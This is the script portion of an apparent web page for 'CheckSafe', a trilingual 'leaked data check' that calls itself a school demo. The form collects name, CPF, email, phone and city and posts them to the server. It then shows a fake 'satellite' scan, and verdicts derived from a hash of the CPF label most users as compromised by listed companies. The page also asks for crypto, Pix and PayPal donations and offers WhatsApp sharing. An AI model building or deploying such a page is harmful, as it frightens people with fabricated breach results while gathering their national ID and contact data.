donación',donationP:'Elige una opción demostrativa para apoyar el proyecto.',demoBadge:'100% demostrativo',copyAddress:'Copiar dirección',copyPix:'Copiar clave Pix',paypalP:'Cambia el enlace por tu enlace real cuando quieras.',paypalBtn:'Donar por PayPal',backBtn:'← Volver',footerP:'Consulta demostrativa de datos para presentación escolar.',footerServices:'Servicios',footerConsult:'Consulta de datos',footerHow:'Cómo funciona',footerInfo:'Información',footerDemo:'Proyecto demostrativo'},
en:{navHome:'Home',navCheck:'Check',navAbout:'About',navTech:'Technology',navSupport:'Support',heroTitle:'Leaked information<br><span>Check it?</span>',heroSub:'Check whether your information was exposed in an app or website.',heroBtn:'Start checking',statBases:'simulated databases',statRecords:'records analyzed',chooseTitle:'Which information do you want to search?',chooseSub:'Select an option to show the form below.',data01Title:'Personal data 01',data01Sub:'Main personal data check.',data02Title:'Personal data 02',data02Sub:'Additional personal data check.',continueBtn:'Continue',backOptionsBtn:'← Back to options',panel1Title:'Data check',panel1Sub:'Fill in the information to run a verification.',panel2Title:'Additional check',panel2Sub:'Search other types of information using the same submission and report flow.',nameLabel:'Full name',namePh:'Enter your name',cpfLabel:'CPF',emailLabel:'Email',phoneLabel:'Phone',phonePh:'(00) 00000-0000',cityLabel:'City',cityPh:'Enter your city',extraLabel:'Additional information',extraPh:'Example: username, domain, document or reference',typeLabel:'Check type',optSecurity:'Security verification',optExposure:'Data exposure check',optFull:'Full analysis',optCpf:'CPF analysis',optPhone:'Phone analysis',optEmail:'Email analysis',submitBtn:'Check now',scanSteps:[['Starting scan...','Preparing data for a secure check.'],['Connecting to satellite...','Synchronizing global verification points.'],['Cross-checking information...','Comparing data across multiple analysis layers.'],['Validating identity...','Looking for possible records related to the registration.'],['Finalizing report...','Organizing the final verification result.']],safeTitle:'Data safe',safeP:'No relevant occurrences were found during this demo analysis.',safeStatus:'Status: protected',safeBoxT:'✅ No occurrences found',safeBoxP:'The system found no critical records related to the submitted data.',dangerTitle:'Data compromised',dangerP:'The analysis found possible exposure signals. Below are simulated company/service examples.',dangerStatus:'Status: attention needed',occurrence:'simulated occurrence found',occurrences:'simulated occurrences found',fixedCpf:'The quantity and companies are fixed by the submitted CPF. The same CPF always shows the same result.',found:'Found',compromisedData:'Compromised data',share:'Share result',retry:'New search',copied:'Result copied to share.',aboutTitle:'Why check your data?',aboutP1:'When personal information appears in exposed databases, it can be used in scam attempts, improper registrations and suspicious contacts.',eduLabel:'Educational project:',aboutP2:'the displayed results are simulated for a school presentation.',analyzeTitle:'What does the system analyze?',feat1T:'Registration validation',feat1P:'Checks whether fields were filled correctly before analysis.',feat2T:'Demo search',feat2P:'Shows a visual satellite scan with real-time messages.',feat3T:'Final report',feat3P:'Shows a safe or compromised result with organized details.',perfTitle:'🛡️ Verification performance',perf1:'simulated checks',perf2:'visual stability',perf3:'analysis points',mapTitle:'Globally distributed analysis',mapP1:'During verification, the system simulates communication between multiple analysis points worldwide.',mapP2:'Satellites represent information synchronization between different validation layers.',privacyText:'During the demonstration, the system presents a checking experience with validation, processing animation and a visual report.',supportTitle:'Support this project',supportP:'CheckSafe is an educational demo created to present a modern data-checking and digital-security experience.',supportBtn:'Support project',donationTitle:'<span>₿</span> Donation options',donationP:'Choose one demo option below to support the project.',demoBadge:'100% demo',copyAddress:'Copy address',copyPix:'Copy Pix key',paypalP:'Replace the link below with your real link whenever you want.',paypalBtn:'Donate via PayPal',backBtn:'← Back',footerP:'Demo data check for a school presentation.',footerServices:'Services',footerConsult:'Data check',footerHow:'How it works',footerInfo:'Information',footerDemo:'Demo project'}
};
let currentLang = localStorage.getItem('checksafe_lang') || 'pt';
function tr(k){ return (I18N[currentLang] && I18N[currentLang][k]) || I18N.pt[k] || k; }
function applyLang(lang){ currentLang = I18N[lang] ? lang : 'pt'; localStorage.setItem('checksafe_lang', currentLang); document.documentElement.lang = currentLang === 'pt' ? 'pt-BR' : currentLang; document.querySelectorAll('[data-i18n]').forEach(el => el.textContent = tr(el.dataset.i18n)); document.querySelectorAll('[data-i18n-html]').forEach(el => el.innerHTML = tr(el.dataset.i18nHtml)); document.querySelectorAll('[data-i18n-placeholder]').forEach(el => el.placeholder = tr(el.dataset.i18nPlaceholder)); document.querySelectorAll('.lang-switch button').forEach(b => b.classList.toggle('active', b.dataset.lang === currentLang)); if(window.atualizarTipoConsulta) window.atualizarTipoConsulta(); }
document.querySelectorAll('.lang-switch button').forEach(b => b.addEventListener('click', () => applyLang(b.dataset.lang)));
function maskCPF(v){return v.replace(/\D/g,'').slice(0,11).replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})$/,'$1-$2');}
function maskPhone(v){return v.replace(/\D/g,'').slice(0,11).replace(/(\d{2})(\d)/,'($1) $2').replace(/(\d{5})(\d)/,'$1-$2');}
function aplicarMascarasCampos(){
    document.querySelectorAll('[data-field-type="cpf"]').forEach(c => { if(!c.dataset.maskReady){ c.dataset.maskReady='1'; c.addEventListener('input', e => e.target.value = maskCPF(e.target.value)); } });
    document.querySelectorAll('[data-field-type="phone"]').forEach(t => { if(!t.dataset.maskReady){ t.dataset.maskReady='1'; t.addEventListener('input', e => e.target.value = maskPhone(e.target.value)); } });
}
aplicarMascarasCampos();

function escapeHtml(v){ return String(v).replace(/[&<>"']/g, function(m){ return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[m]; }); }
function configurarSeletorConsulta(){
    const selectorCard = document.querySelector('.type-selector-card');
    const formCard = document.getElementById('formulario-consulta');
    const abrirBtn = document.getElementById('abrirConsultaSelecionada');
    const voltarBtn = document.getElementById('voltarOpcoesConsulta');
    if(!selectorCard || !formCard || !abrirBtn) return;
    const opcoes = selectorCard.querySelectorAll('.query-type-option');
    const radios = selectorCard.querySelectorAll('[name="tipo_pesquisa_ui"]');
    const origem = formCard.querySelector('[name="origem_form"]');
    const produto = formCard.querySelector('[name="produto"]');
    function atual(){ return selectorCard.querySelector('[name="tipo_pesquisa_ui"]:checked')?.value || 'dados01'; }
    function aplicar(){
        const tipo = atual();
        opcoes.forEach(op => op.classList.toggle('active', op.querySelector('input')?.checked));
        const texto = tipo === 'dados02' ? tr('data02Title') : tr('data01Title');
        const cfg = CHECKSAFE_FORMS_CONFIG[tipo] || CHECKSAFE_FORMS_CONFIG.dados01 || {};
        if(origem) origem.value = texto;
        if(produto){ produto.value = tipo === 'dados02' ? 'Dados pessoas 02' : 'Dados pessoas 01'; }
        const formId = formCard.querySelector('[name="form_id"]');
        if(formId) formId.value = tipo;
        const titulo = formCard.querySelector('.panel-title h2');
        const subtitulo = formCard.querySelector('.panel-title p');
        const submit = formCard.querySelector('.formConsulta button[type="submit"]');
        if(titulo) titulo.textContent = cfg.title || texto;
        if(subtitulo) subtitulo.textContent = cfg.subtitle || '';
        if(submit) submit.textContent = cfg.button || tr('submitBtn');
        const wrap = formCard.querySelector('#dynamic-form-fields');
        if(wrap && Array.isArray(cfg.fields)){
            wrap.innerHTML = cfg.fields.filter(f => f && f.enabled).map(f => {
                const name = String(f.name || '').replace(/[^a-zA-Z0-9_]/g,'');
                if(!name) return '';
                const type = f.type === 'email' ? 'email' : 'text';
                const max = f.type === 'cpf' ? ' maxlength="14"' : (f.type === 'phone' ? ' maxlength="15"' : '');
                const req = f.required ? ' required' : '';
                return `<label><span>${escapeHtml(f.label || name)}</span><input name="${escapeHtml(name)}" type="${type}" placeholder="${escapeHtml(f.placeholder || '')}" data-field-type="${escapeHtml(f.type || 'text')}"${max}${req}></label>`;
            }).join('');
            aplicarMascarasCampos();
        }
    }
    function resetarCardConsulta(){
        const form = formCard.querySelector('.formConsulta');
        const titulo = formCard.querySelector('.panel-title');
        const scanner = formCard.querySelector('.scanner-wrap');
        const resultado = formCard.querySelector('.result-card');
        const btn = form ? form.querySelector('button[type="submit"]') : null;
        if(form) form.classList.remove('form-hidden');
        if(titulo) titulo.classList.remove('hide-title');
        if(scanner) scanner.classList.remove('show');
        if(resultado){ resultado.className = 'result-card'; resultado.innerHTML = ''; }
        if(btn){ btn.disabled = false; btn.innerText = tr('submitBtn'); }
    }
    window.atualizarTipoConsulta = aplicar;
    radios.forEach(r => r.addEventListener('change', aplicar));
    abrirBtn.addEventListener('click', () => {
        aplicar();
        resetarCardConsulta();
        selectorCard.classList.add('selector-card-hidden');
        formCard.classList.remove('form-card-hidden');
        setTimeout(() => formCard.scrollIntoView({behavior:'smooth', block:'start'}), 80);
    });
    if(voltarBtn){
        voltarBtn.addEventListener('click', () => {
            resetarCardConsulta();
            formCard.classList.add('form-card-hidden');
            selectorCard.classList.remove('selector-card-hidden');
            setTimeout(() => selectorCard.scrollIntoView({behavior:'smooth', block:'center'}), 80);
        });
    }
    aplicar();
}
configurarSeletorConsulta();
let ultimoResultadoCompartilhar = '';
let ultimoResultadoDados = null;
function hashCPF(cpfValue){let hash=0; for(let i=0;i<cpfValue.length;i++){hash=((hash<<5)-hash)+cpfValue.charCodeAt(i); hash|=0;} return Math.abs(hash);}
const empresasDemo = <?= json_encode(checksafe_empresas_demo(), JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES) ?>;
function resultadoPorCPF(cpfValue, resultadoServidor){ if(resultadoServidor && resultadoServidor.resultado) return resultadoServidor.resultado; const cpfLimpo=(cpfValue||'').replace(/\D/g,'').slice(0,11); const h=hashCPF(cpfLimpo || '00000000000'); const params=new URLSearchParams(window.location.search); const teste=(params.get('teste') || params.get('resultado') || '').toLowerCase(); if(['seguro','safe','ok'].includes(teste)) return {seguro:true,status:'seguro',quantidade:0,empresas:[]}; let quantidade=(h%6)+1; let seguro=(h%10)<2; if(['vazado','comprometido','danger','risco'].includes(teste)) seguro=false; if(seguro) return {seguro:true,status:'seguro',quantidade:0,empresas:[]}; const inicio=h%empresasDemo.length; const lista=[]; for(let i=0;i<quantidade;i++) lista.push(empresasDemo[(inicio+i)%empresasDemo.length]); return {seguro:false,status:'comprometido',quantidade,empresas:lista}; }
function montarEmpresasDemo(resultado){ const quantidade=resultado.quantidade; const cards=(resultado.empresas || []).map(empresa => `<article class="company-card"><div class="company-top"><span>${empresa.data}</span><small>${empresa.tipo}</small></div><h4>${empresa.nome}</h4><p>${empresa.texto}</p><div class="company-data"><b>${tr('compromisedData')}</b>${empresa.dados.map(dado => `<em>${dado}</em>`).join('')}</div></article>`).join(''); return `<div class="breach-modern"><div class="breach-alert"><div class="breach-alert-icon">⚠</div><div><strong>${quantidade} ${quantidade === 1 ? tr('occurrence') : tr('occurrences')}</strong><span>${tr('fixedCpf')}</span></div></div><div class="breach-found-list"><div><span>Nome</span><b>${tr('found')}</b></div><div><span>CPF</span><b>${tr('found')}</b></div><div><span>E-mail</span><b>${tr('found')}</b></div><div><span>Telefone</span><b>${tr('found')}</b></div></div><div class="breach-company-grid">${cards}</div></div>`; }
function compartilharResultado(){ const texto=ultimoResultadoCompartilhar || 'CheckSafe'; if(navigator.share){navigator.share({title:'Resultado CheckSafe',text:texto}).catch(()=>{});} else if(navigator.clipboard){navigator.clipboard.writeText(texto).then(()=>alert(tr('copied')));} else alert(texto); }
function novaPesquisa(){ window.location.href = window.location.pathname; }
function botoesResultado(){ return `<div class="result-actions"><button type="button" class="share-btn" onclick="compartilharResultado()">${tr('share')}</button><button type="button" class="retry-btn" onclick="novaPesquisa()">${tr('retry')}</button></div>`; }
function mostrarResultado(card, resultadoServidor){ const cpfCampo = card.querySelector('[name="cpf"]'); const resultado = resultadoPorCPF(cpfCampo ? cpfCampo.value : '', resultadoServidor); const seguro = !!resultado.seguro; const resultCard = card.querySelector('.result-card'); const scanner = card.querySelector('.scanner-wrap'); ultimoResultadoDados = resultado; resultCard.className='result-card show ' + (seguro ? 'safe':'danger'); if(seguro){ ultimoResultadoCompartilhar = `CheckSafe\n\n✅ ${tr('safeTitle')}\n${tr('safeBoxP')}`; resultCard.innerHTML = `<div class="result-summary"><div class="result-icon">✓</div><div><h3>${tr('safeTitle')}</h3><p>${tr('safeP')}</p><strong>${tr('safeStatus')}</strong></div></div><div class="safe-details safe-details-plus"><h4>${tr('safeBoxT')}</h4><p>${tr('safeBoxP')}</p><div class="check-list"><span>✓ Nome</span><span>✓ CPF</span><span>✓ E-mail</span><span>✓ Telefone</span></div></div>${botoesResultado()}`; } else { const nomesEmpresas=(resultado.empresas || []).map(e=>'• '+e.nome).join('\n'); ultimoResultadoCompartilhar = `CheckSafe\n\n⚠️ ${tr('dangerTitle')}\n${resultado.quantidade} ${resultado.quantidade === 1 ? tr('occurrence') : tr('occurrences')}\n${nomesEmpresas}`; resultCard.innerHTML = `<div class="result-summary"><div class="result-icon">!</div><div><h3>${tr('dangerTitle')}</h3><p>${tr('dangerP')}</p><strong>${tr('dangerStatus')}</strong></div></div>${montarEmpresasDemo(resultado)}${botoesResultado()}`; } scanner.classList.remove('show'); resultCard.scrollIntoView({behavior:'smooth', block:'center'}); }
function tempoDaAnalise(){ const params=new URLSearchParams(window.location.search); if(params.get('rapido')==='1' || params.get('teste')) return 1500; return 10000; }
document.querySelectorAll('.consulta-card').forEach(card => { const form=card.querySelector('.formConsulta'); const btn=form ? form.querySelector('button[type="submit"]') : null; const scanner=card.querySelector('.scanner-wrap'); const resultCard=card.querySelector('.result-card'); const title=card.querySelector('.panel-title'); const scanTitle=card.querySelector('.scanTitle'); const scanMessage=card.querySelector('.scanMessage'); if(!form || !btn) return; form.addEventListener('submit', async e => { e.preventDefault(); if(!form.checkValidity()){ form.reportValidity(); return; } btn.disabled=true; btn.innerText=tr('submitBtn') + '...'; form.classList.add('form-hidden'); if(title) title.classList.add('hide-title'); scanner.classList.add('show'); resultCard.className='result-card'; resultCard.innerHTML=''; scanner.scrollIntoView({behavior:'smooth', block:'center'}); let i=0; const steps=tr('scanSteps'); scanTitle.textContent=steps[0][0]; scanMessage.textContent=steps[0][1]; const intervalo=setInterval(()=>{ i=(i+1)%steps.length; scanTitle.textContent=steps[i][0]; scanMessage.textContent=steps[i][1]; },1900); let respostaServidor=null; const envioServidor=fetch(window.location.href,{method:'POST',body:new FormData(form),headers:{'X-Requested-With':'fetch'}}).then(r=>r.json()).then(data=>{ if(data && data.ok) respostaServidor=data; }).catch(()=>{}); setTimeout(()=>{ clearInterval(intervalo); Promise.resolve(envioServidor).finally(()=>mostrarResultado(card,respostaServidor)); }, tempoDaAnalise()); }); });
const apoioBox=document.getElementById('apoio'), doacaoPanel=document.getElementById('doacao'), abrirDoacao=document.getElementById('abrirDoacao'), voltarApoio=document.getElementById('voltarApoio');
if(abrirDoacao && apoioBox && doacaoPanel){ abrirDoacao.addEventListener('click',()=>{ apoioBox.classList.add('support-hidden'); doacaoPanel.classList.add('show'); doacaoPanel.setAttribute('aria-hidden','false'); setTimeout(()=>doacaoPanel.scrollIntoView({behavior:'smooth',block:'start'}),80); }); }
if(voltarApoio && apoioBox && doacaoPanel){ voltarApoio.addEventListener('click',()=>{ doacaoPanel.classList.remove('show'); doacaoPanel.setAttribute('aria-hidden','true'); apoioBox.classList.remove('support-hidden'); setTimeout(()=>apoioBox.scrollIntoView({behavior:'smooth',block:'center'}),80); }); }

function compartilharSiteWhatsApp(){
    const url = window.location.origin + window.location.pathname;
    const texto = `🛡️ CheckSafe
Faça uma verificação demonstrativa de segurança digital:
${url}`;
    window.open('https://wa.me/?text=' + encodeURIComponent(texto), '_blank', 'noopener,noreferrer');
}

function copiarDoacao(texto){ if(navigator.clipboard){navigator.clipboard.writeText(texto).then(()=>alert('OK'));} else alert(texto); }
applyLang(currentLang);
</script>
</body>
</html>
